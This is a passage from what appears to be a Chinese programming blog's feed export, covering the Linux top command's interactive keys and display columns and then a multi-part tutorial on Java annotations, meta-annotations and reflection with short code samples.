<p>top 运行中可以通过 top 的内部命令对进程的显示方式进行控制。内部命令如下：<br>s – 改变画面更新频率<br>l – 关闭或开启第一部分第一行 top 信息的表示<br>t – 关闭或开启第一部分第二行 Tasks 和第三行 Cpus 信息的表示<br>m – 关闭或开启第一部分第四行 Mem 和 第五行 Swap 信息的表示<br>N – 以 PID 的大小的顺序排列表示进程列表<br>P – 以 CPU 占用率大小的顺序排列进程列表<br>M – 以内存占用率大小的顺序排列进程列表<br>h – 显示帮助<br>n – 设置在进程列表所显示进程的数量<br>q – 退出 top<br>s – 改变画面更新周期</p>
<p>序号 列名 含义<br>a PID 进程id<br>b PPID 父进程id<br>c RUSER Real user name<br>d UID 进程所有者的用户id<br>e USER 进程所有者的用户名<br>f GROUP 进程所有者的组名<br>g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ?<br>h PR 优先级<br>i NI nice值。负值表示高优先级，正值表示低优先级<br>j P 最后使用的CPU，仅在多CPU环境下有意义<br>k %CPU 上次更新到现在的CPU时间占用百分比<br>l TIME 进程使用的CPU时间总计，单位秒<br>m TIME+ 进程使用的CPU时间总计，单位1&#x2F;100秒<br>n %MEM 进程使用的物理内存百分比<br>o VIRT 进程使用的虚拟内存总量，单位kb。VIRT&#x3D;SWAP+RES<br>p SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。<br>q RES 进程使用的、未被换出的物理内存大小，单位kb。RES&#x3D;CODE+DATA<br>r CODE 可执行代码占用的物理内存大小，单位kb<br>s DATA 可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb<br>t SHR 共享内存大小，单位kb<br>u nFLT 页面错误次数<br>v nDRT 最后一次写入到现在，被修改过的页面数。<br>w S 进程状态。（D&#x3D;不可中断的睡眠状态，R&#x3D;运行，S&#x3D;睡眠，T&#x3D;跟踪&#x2F;停止，Z&#x3D;僵尸进程）<br>x COMMAND 命令名&#x2F;命令行<br>y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名<br>z Flags 任务标志，参考 sched.h</p>
<p>默认情况下仅显示比较重要的 PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND 列。可以通过下面的快捷键来更改显示内容。</p>
<p>通过 f 键可以选择显示的内容。</p>
<p>按 f 键之后会显示列的列表，按 a-z 即可显示或隐藏对应的列，最后按回车键确定。</p>
<p>按 o 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z 可以将相应的列向左移动。最后按回车键确定。</p>
<p>按大写的 F 或 O 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的 R 键可以将当前的排序倒转。</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】annotation注释（二）</title>
    <url>/blog/plang/java/features/annotation2/</url>
    <content><![CDATA[<h2 id="annotation类型声明方式"><a href="#annotation类型声明方式" class="headerlink" title="annotation类型声明方式"></a>annotation类型声明方式</h2><p>通常，应用程序并不是必须定义annotation类型，但是定义annotation类型并非难事。Annotation类型声明于一般的接口声明极为类似，区别只在于它在interface关键字前面使用”@”符号。</p>
<p>annotation类型的每个方法声明定义了一个annotation类型成员，但方法声明不必有参数或者异常声明；方法返回值的类型被限制在以下的范围：primitives、String、Class、enums、annotation和前面类型的数组；方法可以有默认值。</p>
<p>下面是一个简单的annotation类型声明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.FIELD)</span><br><span class="line">public @interface Column &#123;</span><br><span class="line">    boolean isKey() default false;//用于判定是否为数据库中的主键列</span><br><span class="line">    boolean canNull() default true;//用于插入时判定not null列是否有值</span><br><span class="line">    String value() default &quot;[ColumnName]&quot;;//数据库中对应的列名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="修饰方法的annotation声明方式"><a href="#修饰方法的annotation声明方式" class="headerlink" title="修饰方法的annotation声明方式"></a>修饰方法的annotation声明方式</h2><p>annotation是一种修饰符，能够如其它修饰符（如public、static、final）一般使用。习惯用法是annotaions用在其它的修饰符前面。annotations由”@+annotation类型+带有括号的成员-值列表”组成。这些成员的值必须是编译时常量（即在运行时不变）。</p>
<p>下面是一个使用了[Column] annotation的方法声明：\</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//由于表名和属性名和数据库中的对应，可以不加注释</span><br><span class="line">@Table(CV.TN_CHARTYPE)</span><br><span class="line">public class CharType &#123;</span><br><span class="line">    @Column(isKey=true,value=CV.DB_ID)</span><br><span class="line">    private String id;</span><br><span class="line">    @Column(CV.CT_CN_NAME)</span><br><span class="line">    private String name;</span><br><span class="line">    @Column(CV.CT_CN_DESC)</span><br><span class="line">    private String describe;</span><br><span class="line">    public String getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setId(String id) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getDescribe() &#123;</span><br><span class="line">        return describe;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setDescribe(String describe) &#123;</span><br><span class="line">        this.describe = describe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="没有成员的annotation类型声明"><a href="#没有成员的annotation类型声明" class="headerlink" title="没有成员的annotation类型声明"></a>没有成员的annotation类型声明</h2><p>当声明一个没有成员的annotation类型声明时，可使用以下方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**     </span><br><span class="line">* Indicates that the specification of the annotated API element     </span><br><span class="line">* is preliminary and subject to change.     </span><br><span class="line">*/    </span><br><span class="line">public @interface Preliminary &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>作为上面没有成员的annotation类型声明的简写方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Preliminary public class TimeTravel &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<h2 id="只有唯一一个成员annotations的声明"><a href="#只有唯一一个成员annotations的声明" class="headerlink" title="只有唯一一个成员annotations的声明"></a>只有唯一一个成员annotations的声明</h2><p>如果在annotations中只有唯一一个成员，则该成员应命名为value：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">* Associates a copyright notice with the annotated API element.</span><br><span class="line">*/</span><br><span class="line">public @interface Copyright &#123;</span><br><span class="line">    String value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更为方便的是对于具有唯一成员且成员名为value的annotation（如上文），在其使用时可以忽略掉成员名和赋值号（&#x3D;）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Copyright(&quot;2002 Yoyodyne Propulsion Systems&quot;)</span><br><span class="line">public class OscillationOverthruster &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义Annotation的例子"><a href="#定义Annotation的例子" class="headerlink" title="定义Annotation的例子"></a>定义Annotation的例子</h2><p>[使用annotation来描述那些被标注的成员是不稳定的，需要更改]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.annotation.*;</span><br><span class="line">  </span><br><span class="line">  @Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">  public @interface Unstable &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用Author这个annotation定义在程序中指出代码的作者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public @interface Author &#123;</span><br><span class="line">      /** 返回作者名 */</span><br><span class="line">      String value();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>以下的example更加复杂。Reviews annotation类型只有一个成员，但是这个成员的类型是复杂的：由Review annotation组成的数组。Review annotation类型有3个成员：枚举类型成员grade、表示Review名称的字符串类型成员Reviewer、具有默认值的字符串类型成员Comment。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.annotation.*;</span><br><span class="line">          </span><br><span class="line">  /**</span><br><span class="line">  * Reviews annotation类型只有一个成员，</span><br><span class="line">  * 但是这个成员的类型是复杂的：由Review annotation组成的数组</span><br><span class="line">  */</span><br><span class="line">  @Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">  public @interface Reviews &#123;</span><br><span class="line">      Review[] value();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /**</span><br><span class="line">  * Review annotation类型有3个成员： </span><br><span class="line">  * 枚举类型成员grade、</span><br><span class="line">    * 表示Review名称的字符串类型成员Reviewer、</span><br><span class="line">    * 具有默认值的字符串类型成员Comment。</span><br><span class="line">  */</span><br><span class="line">  public @interface Review &#123;</span><br><span class="line">      // 内嵌的枚举类型</span><br><span class="line">      public static enum Grade &#123; EXCELLENT, SATISFACTORY, UNSATISFACTORY &#125;;</span><br><span class="line">  </span><br><span class="line">      // 下面的方法定义了annotation的成员</span><br><span class="line">      Grade grade();                </span><br><span class="line">      String reviewer();          </span><br><span class="line">      String comment() default &quot;&quot;;  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>最后，我们来定义一个annotation方法用于罗列出类运行中所有的unchecked异常。这个annotation类型将一个数组作为了唯一的成员。数组中的每个元素都是异常类。为了加强对未检查的异常（此类异常都是在运行时抛出）进行报告，我们可以在代码中对异常的类型进行限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public @interface UncheckedExceptions &#123;</span><br><span class="line">      Class&lt;? extends RuntimeException&gt;[] value();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="一个使用annotation的实例"><a href="#一个使用annotation的实例" class="headerlink" title="一个使用annotation的实例"></a>一个使用annotation的实例</h2><p>结合上面所讲的，我们在这里建立一个简单的基于annotation测试框架。首先我们需要一个annotation类型来表示某个方法是一个应该被测试工具运行的测试方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Indicates that the annotated method is a test method.</span><br><span class="line">     * This annotation should be used only on parameterless static methods.</span><br><span class="line">     */</span><br><span class="line">    @Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">    @Target(ElementType.METHOD)</span><br><span class="line">    public @interface Test &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是annotaion类型声明是可以标注自己的，这样的annotation被称为”meta-annotations”。</p>
<p>在上面的代码中，@Retention(RetentionPolicy.RUNTIME)这个meta-annotation表示了此类型的annotation将被虚拟机保留使其能够在运行时通过反射被读取。而@Target(ElementType.METHOD)表示此类型的annotation只能用于修饰方法声明。</p>
<p>下面是一个简单的程序，其中部分方法被上面的annotation所标注：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Foo &#123;</span><br><span class="line">       @Test public static void m1() &#123; &#125;</span><br><span class="line">       public static void m2() &#123; &#125;</span><br><span class="line">       @Test public static void m3() &#123;</span><br><span class="line">           throw new RuntimeException(&quot;Boom&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       public static void m4() &#123; &#125;</span><br><span class="line">       @Test public static void m5() &#123; &#125;</span><br><span class="line">       public static void m6() &#123; &#125;</span><br><span class="line">       @Test public static void m7() &#123;</span><br><span class="line">           throw new RuntimeException(&quot;Crash&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       public static void m8() &#123; &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">    public class RunTests &#123;</span><br><span class="line">       public static void main(String[] args) throws Exception &#123;</span><br><span class="line">          int passed = 0, failed = 0;</span><br><span class="line">          for (Method m : Class.forName(args[0]).getMethods()) &#123;</span><br><span class="line">             if (m.isAnnotationPresent(Test.class)) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                   m.invoke(null);</span><br><span class="line">                   passed++;</span><br><span class="line">                &#125; catch (Throwable ex) &#123;</span><br><span class="line">                   System.out.printf(&quot;Test %s failed: %s %n&quot;, m, ex.getCause());</span><br><span class="line">                   failed++;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          System.out.printf(&quot;Passed: %d, Failed %d%n&quot;, passed, failed);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个程序从命令行参数中取出类名，并且遍历此类的所有方法，尝试调用其中被上面的测试annotation类型标注过的方法。在此过程中为了找出哪些方法被annotation类型标注过，需要使用反射的方式执行此查询。如果在调用方法时抛出异常，此方法被认为已经失败，并打印一个失败报告。最后，打印运行通过&#x2F;失败的方法数量。</p>
<p>下面文字表示了如何运行这个基于annotation的测试工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ java RunTests Foo</span><br><span class="line">Test public static void Foo.m3() failed: java.lang.RuntimeException: Boom </span><br><span class="line">Test public static void Foo.m7() failed: java.lang.RuntimeException: Crash </span><br><span class="line">Passed: 2, Failed 2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】annotation注释（一）</title>
    <url>/blog/plang/java/features/annotation1/</url>
    <content><![CDATA[<h2 id="Annotation究竟是什么？"><a href="#Annotation究竟是什么？" class="headerlink" title="Annotation究竟是什么？ "></a>Annotation究竟是什么？ </h2><p>Annotation提供了一条与程序元素关联任何信息或者任何元数据（metadata）的途径。从某些方面看，annotation就像修饰符一样被使用，并应用于包、类型、构造方法、方法、成员变量、参数、本地变量的声明中。这些信息被存储在annotation的”name&#x3D;value”结构对中。</p>
<p>annotation类型是一种接口，能够通过java反射API的方式提供对其信息的访问。</p>
<p>annotation能被用来为某个程序元素（类、方法、成员变量等）关联任何的信息。需要注意的是，这里存在着一个基本的潜规则：annotaion不能影响程序代码的执行，无论增加、删除annotation，代码都始终如一的执行。另外，尽管一些annotation通过java的反射api方法在运行时被访问，而java语言解释器在工作时忽略了这些annotation。正是由于java虚拟机忽略了annotation，导致了annotation类型在代码中是”不起作用”的；只有通过某种配套的工具才会对annotation类型中的信息进行访问和处理。本文中将涵盖标准的annotation和meta-annotation类型，陪伴这些annotation类型的工具是java编译器（当然要以某种特殊的方式处理它们）。</p>
<p>由于上述原因，annotation在使用时十分简便。一个本地变量可以被一个以NonNull命名的annotation类型所标注，来作为对这个本地变量不能被赋予null值的断言。而我们可以编写与之配套的一个annotation代码分析工具，使用它来对具有前面变量的代码进行解析，并且尝试验证这个断言。当然这些代码并不必自己编写。在JDK安装后，在JDK&#x2F;bin目录中可以找到名为”apt”的工具，它提供了处理annotation的框架：它启动后扫描源代码中的annotation，并调用我们定义好的annotation处理器完成我们所要完成的工作（比如验证前面例子中的断言）。说到这里，annotation的强大功能似乎可以替代XDoclet这类的工具了，随着我们的深入，大家会更加坚信这一点。</p>
<h2 id="为什么使用Annotation"><a href="#为什么使用Annotation" class="headerlink" title="为什么使用Annotation?"></a>为什么使用Annotation?</h2><p>在JAVA应用中，我们常遇到一些需要使用模版代码。例如，为了编写一个JAX-RPC web service，我们必须提供一对接口和实现作为模版代码。如果使用annotation对远程访问的方法代码进行修饰的话，这个模版就能够使用工具自动生成。</p>
<p>另外，一些API需要使用与程序代码同时维护的附属文件。例如，JavaBeans需要一个BeanInfo Class与一个Bean同时使用&#x2F;维护，而EJB则同样需要一个部署描述符。此时在程序中使用annotation来维护这些附属文件的信息将十分便利而且减少了错误。</p>
<h2 id="Annotation的概念和语法"><a href="#Annotation的概念和语法" class="headerlink" title="Annotation的概念和语法"></a>Annotation的概念和语法</h2><p>首先，关键的概念是理解annotation是与一个程序元素相关联信息或者元数据的标注。它从不影响java程序的执行，但是对例如编译器警告或者像文档生成器等辅助工具产生影响。</p>
<p>下面是常用的annotation列表，我们应该注意在annotation和annotation类型之间的不同：</p>
<p>A.annotation：</p>
<p>annotation<br>使用了在java5.0所带来的新语法，它的行为十分类似public、final这样的修饰符。每个annotation具有一个名字和成员个数&gt;&#x3D;0。每个annotation的成员具有被称为name&#x3D;value对的名字和值（就像javabean一样），name&#x3D;value装载了annotation的信息。</p>
<p>B.annotation类型：</p>
<p>annotation类型定义了annotation的名字、类型、成员默认值。一个annotation类型可以说是一个特殊的java接口，它的成员变量是受限制的，而声明annotation类型时需要使用新语法。当我们通过java反射api访问annotation时，返回值将是一个实现了该annotation类型接口的对象，通过访问这个对象我们能方便的访问到其annotation成员。后面的章节将提到在java5.0的java.lang包里包含的3个标准annotation类型。</p>
<p>C.annotation成员：</p>
<p>annotation的成员在annotation类型中以无参数的方法的形式被声明。其方法名和返回值定义了该成员的名字和类型。在此有一个特定的默认语法：允许声明任何annotation成员的默认值：一个annotation可以将name&#x3D;value对作为没有定义默认值的annotation成员的值，当然也可以使用name&#x3D;value对来覆盖其它成员默认值。这一点有些近似类的继承特性，父类的构造函数可以作为子类的默认构造函数，但是也可以被子类覆盖。</p>
<p>D.marker annotation类型：</p>
<p>一个没有成员定义的annotation类型被称为marker annotation。这种annotation类型仅使用自身的存在与否来为我们提供信息。如后面要说的Override。</p>
<p>E.meta-annotation：</p>
<p>meta-annotation也称为元annotation，它是被用来声明annotation类型的annotation。Java5.0提供了一些标准的元-annotation类型。下面介绍的target、retention就是meta-annotation。</p>
<p>F.target：</p>
<p>annotation的target是一个被标注的程序元素。target说明了annotation所修饰的对象范围：annotation可被用于packages、types（类、接口、枚举、annotation类型）、类型成员（方法、构造方法、成员变量、枚举值）、方法参数和本地变量（如循环变量、catch参数）。在annotation类型的声明中使用了target可更加明晰其修饰的目标。</p>
<p>G.retention：</p>
<p>annotation的retention定义了该annotation被保留的时间长短：某些annotation仅出现在源代码中，而被编译器丢弃；而另一些却被编译在class文件中；编译在class文件中的annotation可能会被虚拟机忽略，而另一些在class被装载时将被读取（请注意并不影响class的执行，因为annotation与class在使用上是被分离的）。使用这个meta-annotation可以对annotation的”生命周期”限制。</p>
<p>H.metadata：</p>
<p>由于metadata被广泛使用于各种计算机开发过程中，所以当我们在这里谈论的metadata即元数据通常指被annotation装载的信息或者annotation本身。</p>
<h2 id="Annotation工作方式"><a href="#Annotation工作方式" class="headerlink" title="Annotation工作方式"></a>Annotation工作方式</h2><p>在5.0版之前的Java平台已经具有了一些ad hoc annotation机制。比如，使用transient修饰符来标识一个成员变量在序列化子系统中应被忽略。而@deprecated这个javadoctag也是一个ad hoc annotation用来说明一个方法已过时。从Java5.0版发布以来，5.0平台提供了一个正式的annotation功能：允许开发者定义、使用自己的annoatation类型。此功能由一个定义annotation类型的语法和一个描述annotation声明的语法，读取annotaion的API，一个使用annotation修饰的class文件，一个annotation处理工具（apt）组成。</p>
<p>annotation并不直接影响代码语义，但是它能够工作的方式被看作类似程序的工具或者类库，它会反过来对正在运行的程序语义有所影响。annotation可以从源文件、class文件或者以在运行时反射的多种方式被读取。</p>
<p>当然annotation在某种程度上使javadoctag更加完整。一般情况下，如果这个标记对java文档产生影响或者用于生成java文档的话，它应该作为一个javadoc tag；否则将作为一个annotation。</p>
<h2 id="Annotation与反射"><a href="#Annotation与反射" class="headerlink" title="Annotation与反射"></a>Annotation与反射</h2><p>在java5.0中Java.lang.reflect提供的反射API被扩充了读取运行时annotation的能力。让我们回顾一下前面所讲的：一个annotation类型被定义为runtimeretention后，它才是在运行时可见，当class文件被装载时被保存在class文件中的annotation才会被虚拟机读取。那么reflect是如何帮助我们访问class中的annotation呢？</p>
<p>下文将在java.lang.reflect用于annotation的新特性，其中java.lang.reflect.AnnotatedElement是重要的接口，它代表了提供查询annotation能力的程序成员。这个接口被java.lang.Package、java.lang.Class实现，并间接地被Method类、Constructor类、java.lang.reflect的Field类实现。而annotation中的方法参数可以通过Method类、Constructor类的getParameterAnnotations()方法获得。</p>
<p>isAnnotationPresent ()方法对于检查markerannotation是十分有用的，因为markerannotation没有成员变量，所以我们只要知道class的方法是否使用了annotation修饰就可以了。而当处理具有成员的annotation时，我们通过使用getAnnotation()方法来获得annotation的成员信息（成员名称、成员值）。这里我们看到了一套优美的java annotation系统：如果annotation存在，那么实现了相应的annotation类型接口的对象将被getAnnotation()方法返回，接着调用定义在annotation类型中的成员方法 可以方便地获得任何成员值。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】annotation注释（三）</title>
    <url>/blog/plang/java/features/annotation3/</url>
    <content><![CDATA[<h2 id="内建Annotation"><a href="#内建Annotation" class="headerlink" title="内建Annotation"></a>内建Annotation</h2><p>Java5.0版在java语法中经常用到的内建Annotation：</p>
<ol>
<li>@Deprecated用于修饰已经过时的方法；</li>
<li>@Override用于修饰此方法覆盖了父类的方法（而非重载）；</li>
<li>@SuppressWarnings用于通知java编译器禁止特定的编译警告。</li>
</ol>
<p>下面代码展示了内建Annotation类型的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class UsingBuiltInAnnotation &#123;</span><br><span class="line">        //食物类</span><br><span class="line">        class Food&#123;&#125;</span><br><span class="line">        //干草类</span><br><span class="line">        class Hay extends Food&#123;&#125;</span><br><span class="line">        //动物类</span><br><span class="line">        class Animal&#123;</span><br><span class="line">                Food getFood()&#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line">                //使用Annotation声明Deprecated方法</span><br><span class="line">                @Deprecated</span><br><span class="line">                void deprecatedMethod()&#123;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //马类-继承动物类</span><br><span class="line">        class Horse extends Animal&#123;</span><br><span class="line">                //使用Annotation声明覆盖方法</span><br><span class="line">                @Override</span><br><span class="line">                Hay getFood()&#123;</span><br><span class="line">                        return new Hay();</span><br><span class="line">                &#125;</span><br><span class="line">                //使用Annotation声明禁止警告</span><br><span class="line">                @SuppressWarnings(&#123;&quot;deprecation&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">                void callDeprecatedMethod(List horseGroup)&#123;</span><br><span class="line">                        Animal an=new Animal();</span><br><span class="line">                        an.deprecatedMethod();</span><br><span class="line">                        horseGroup.add(an);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用标准Annotation"><a href="#使用标准Annotation" class="headerlink" title="使用标准Annotation"></a>使用标准Annotation</h2><p>java5.0在java.lang包中定义了3种标准的annotation类型：</p>
<h2 id="A-Override："><a href="#A-Override：" class="headerlink" title="A.Override："></a>A.Override：</h2><p>java.lang.Override 是一个marker<br>annotation类型，它被用作标注方法。它说明了被标注的方法重载了父类的方法，起到了断言的作用。如果我们使用了这种annotation在一个没有覆盖父类方法的方法时，java编译器将以一个编译错误来警示。<br>这个annotaton常常在我们试图覆盖父类方法而确又写错了方法名时发挥威力。<br>使用方法极其简单：在使用此annotation时只要在被修饰的方法前面加上@Override。<br>下面的代码是一个使用@Override修饰一个企图重载父类的toString方法，而又存在拼写错误的sample：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">  public String toString() &#123;   </span><br><span class="line">      return &quot;[&quot; + super.toString() + &quot;]&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="B-Deprecated："><a href="#B-Deprecated：" class="headerlink" title="B.Deprecated："></a>B.Deprecated：</h2><p>同样Deprecated也是一个marker<br>annotation。当一个类型或者类型成员使用@Deprecated修饰的话，编译器将不鼓励使用这个被标注的程序元素。而且这种修饰具有一定的<br>“延续性”：如果我们在代码中通过继承或者覆盖的方式使用了这个过时的类型或者成员，虽然继承或者覆盖后的类型或者成员并不是被声明为<br>@Deprecated，但编译器仍然要报警。</p>
<p>值得注意，@Deprecated这个annotation类型和javadoc中的<br>@deprecated这个tag是有区别的：前者是java编译器识别的，而后者是被javadoc工具所识别用来生成文档（包含程序成员为什么已经过时、它应当如何被禁止或者替代的描述）。</p>
<p>在java5.0，java编译器仍然象其从前版本那样寻找@deprecated这个javadoc<br>tag，并使用它们产生警告信息。但是这种状况将在后续版本中改变，我们应在现在就开始使用@Deprecated来修饰过时的方法而不是<br>@deprecated javadoc tag。</p>
<p>下面是一段使用@Deprecated的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">  * 这里是javadoc的@deprecated声明.</span><br><span class="line">  * @deprecated No one has players for this format any more.  Use VHS instead.</span><br><span class="line">  */</span><br><span class="line">  @Deprecated public class Betamax &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<h2 id="C-SuppressWarnings："><a href="#C-SuppressWarnings：" class="headerlink" title="C.SuppressWarnings："></a>C.SuppressWarnings：</h2><p>@SuppressWarnings<br>被用于有选择的关闭编译器对类、方法、成员变量、变量初始化的警告。在java5.0，sun提供的javac编译器为我们提供了-Xlint选项来使编译器对合法的程序代码提出警告，此种警告从某种程度上代表了程序错误。例如当我们使用一个generic<br>collection类而又没有提供它的类型时，编译器将提示出&quot;unchecked<br>warning&quot;的警告。</p>
<p>通常当这种情况发生时，我们就需要查找引起警告的代码。如果它真的表示错误，我们就需要纠正它。例如如果警告信息表明我们代码中的switch语句没有覆盖所有可能的case，那么我们就应增加一个默认的case来避免这种警告。</p>
<p>相仿，有时我们无法避免这种警告，例如，我们使用必须和非generic的旧代码交互的generic<br>collection类时，我们不能避免这个unchecked<br>warning。此时@SuppressWarning就要派上用场了，在调用的方法前增加@SuppressWarnings修饰，告诉编译器停止对此方法的警告。</p>
<p>SuppressWarning不是一个marker<br>annotation。它有一个类型为String[]的成员，这个成员的值为被禁止的警告名。对于javac编译器来讲，被-Xlint选项有效的警告名也同样对@SuppressWarings有效，同时编译器忽略掉无法识别的警告名。</p>
<p>annotation语法允许在annotation名后跟括号，括号中是使用逗号分割的name&#x3D;value对用于为annotation的成员赋值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SuppressWarnings(value=&#123;&quot;unchecked&quot;,&quot;fallthrough&quot;&#125;)</span><br><span class="line">public void lintTrap() &#123; /* sloppy method body omitted */ &#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中SuppressWarnings<br>annotation类型只定义了一个单一的成员，所以只有一个简单的value&#x3D;{...}作为name&#x3D;value对。又由于成员值是一个数组，故使用大括号来声明数组值。</p>
<p>注意：我们可以在下面的情况中缩写annotation：当annotation只有单一成员，并成员命名为&quot;value&#x3D;&quot;。这时可以省去&quot;value&#x3D;&quot;。比如将上面的SuppressWarnings<br>annotation进行缩写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SuppressWarnings(&#123;&quot;unchecked&quot;,&quot;fallthrough&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>如果SuppressWarnings所声明的被禁止警告个数为一个时，可以省去大括号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="开发者自定义Annotation"><a href="#开发者自定义Annotation" class="headerlink" title="开发者自定义Annotation"></a>开发者自定义Annotation</h2><p>由开发者自定义Annotation类型。<br>下面是一个使用annotation进行方法测试的sample：<br>AnnotationDefineForTestFunction类型定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.annotation.*;</span><br><span class="line">//加载在VM中，在运行时进行映射</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">//限定此annotation只能标示方法</span><br><span class="line">@Target(ElementType.METHOD)</span><br><span class="line">public @interface AnnotationDefineForTestFunction&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>测试annotation的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class UsingAnnotation &#123;</span><br><span class="line">        @AnnotationDefineForTestFunction public static void method01()&#123;&#125;</span><br><span class="line">        </span><br><span class="line">        public static void method02()&#123;&#125;</span><br><span class="line">        </span><br><span class="line">        @AnnotationDefineForTestFunction public static void method03()&#123;</span><br><span class="line">                throw new RuntimeException(&quot;method03&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        public static void method04()&#123;</span><br><span class="line">                throw new RuntimeException(&quot;method04&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        public static void main(String[] argv) throws Exception&#123;</span><br><span class="line">                int passed = 0, failed = 0;</span><br><span class="line">                //被检测的类名</span><br><span class="line">                String className=&quot;com.bjinfotech.practice.annotation.UsingAnnotation&quot;;</span><br><span class="line">                //逐个检查此类的方法，当其方法使用annotation声明时调用此方法</span><br><span class="line">            for (Method m : Class.forName(className).getMethods()) &#123;</span><br><span class="line">               if (m.isAnnotationPresent(AnnotationDefineForTestFunction.class)) &#123;</span><br><span class="line">                  try &#123;</span><br><span class="line">                     m.invoke(null);</span><br><span class="line">                     passed++;</span><br><span class="line">                  &#125; catch (Throwable ex) &#123;</span><br><span class="line">                     System.out.printf(&quot;测试 %s 失败: %s %n&quot;, m, ex.getCause());</span><br><span class="line">                     